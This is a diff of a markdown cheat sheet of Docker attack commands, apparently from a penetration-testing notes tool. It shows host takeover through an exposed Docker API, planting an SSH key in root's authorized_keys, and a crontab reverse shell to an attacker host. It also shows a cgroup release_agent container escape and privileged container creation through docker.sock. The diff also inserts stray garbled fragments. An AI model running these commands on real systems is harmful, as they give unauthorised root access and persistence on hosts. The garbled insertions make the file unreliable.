@@ -3,7 +3,7 @@ id: "1rmfkk9swmptl041e"
 title: "docker"
 description: ""
 tags: []
-order: 9
+order: "9"
 createdAt: "2026-05-31T09:32:44.786Z"
 updatedAt: "2026-05-31T09:33:30.292Z"
 ---
@@ -153,7 +153,7 @@ docker -H tcp://$TARGET:2375 run --rm -v /:/host alpine sh -c \
 
 ### eae0uwg55mptl08y2
 ```bash
-  "echo 'ssh-rsa AAAA...' >> /host/root/.ssh/authorized_keys"
+"echo 'ssh-rsa AAAA...' >> /host/root/.ssh/authorized_keys"
 ```
 
 **Tags:** docker, rce, api, exploitation, privesc
@@ -169,7 +169,7 @@ docker -H tcp://$TARGET:2375 run --rm -v /:/host alpine sh -c \
 
 ### 9ftpd7bh9mptl08yb
 ```bash
-  "echo '* * * * * root bash -i >& /dev/tcp/$LHOST/4444 0>&1' >> /host/etc/crontab"
+"echo '* * * * * root bash -i >& /dev/tcp/$LHOST/4444 0>&1' >> /host/etc/crontab"
 ```
 
 **Tags:** docker, rce, api, exploitation, privesc
@@ -209,6 +209,8 @@ mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 
+_on_
+
 **Tags:** docker, container-escape, privileged, exploitation
 <!-- cmd: {"id":"8fh2mg1bmmptl08z0","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->
 
@@ -224,6 +226,8 @@ host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
 ```bash
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
+
+_path/cmd" > /tmp/cgrp/release_
 
 **Tags:** docker, container-escape, privileged, exploitation
 <!-- cmd: {"id":"zkqpcq9ffmptl08z9","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->
@@ -339,7 +343,7 @@ curl --unix-socket /var/run/docker.sock -s -X POST \
 
 ### 1x723kkxfmptl091j
 ```bash
-  -H "Content-Type: application/json" \
+-H "Content-Type: application/json" \
 ```
 
 **Tags:** docker, container-escape, socket, exploitation
@@ -347,7 +351,7 @@ curl --unix-socket /var/run/docker.sock -s -X POST \
 
 ### 4luhzvsk7mptl091o
 ```bash
-  http://localhost/containers/create \
+http://localhost/containers/create \
 ```
 
 **Tags:** docker, container-escape, socket, exploitation
@@ -355,7 +359,7 @@ curl --unix-socket /var/run/docker.sock -s -X POST \
 
 ### ru03ri77fmptl091t
 ```bash
-  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host && bash"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"HostConfig":{"Privileged":true}}'
+-d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host && bash"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"HostConfig":{"Privileged":true}}'
 ```
 
 **Tags:** docker, container-escape, socket, exploitation
